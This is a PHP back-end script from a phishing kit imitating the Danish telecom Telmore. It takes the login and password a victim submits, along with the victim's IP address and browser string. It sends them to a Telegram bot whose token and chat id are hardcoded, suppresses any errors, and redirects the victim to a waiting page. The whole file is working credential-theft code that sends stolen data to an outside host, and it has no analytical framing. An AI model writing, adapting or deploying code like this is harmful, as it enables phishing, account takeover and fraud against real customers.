<?php

// Get IP address - compatible with all servers
$zabi = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : (getenv("REMOTE_ADDR") ? getenv("REMOTE_ADDR") : 'Unknown');

// Initialize message
$message = "";

$message .= "-------Telmore----------\n";

$message .= "login and password : ".(isset($_POST['phone']) ? $_POST['phone'] : 'N/A')."\n";

$message .= "----------- IP Infos -------\n";

$message .= "IP       : $zabi\n";

$message .= "BROWSER  : ".(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown')."\n";

$message .= "------------------------------------\n";

$token = "8529028584:AAF7Zjo0gb9Va07nEWcPMuuNG4SHH2PBv04";

$data = array(
    'text' => $message,
    'chat_id' => '-5550025222'
);

@file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

header("Location: wait.html?from=login");
exit();

?>

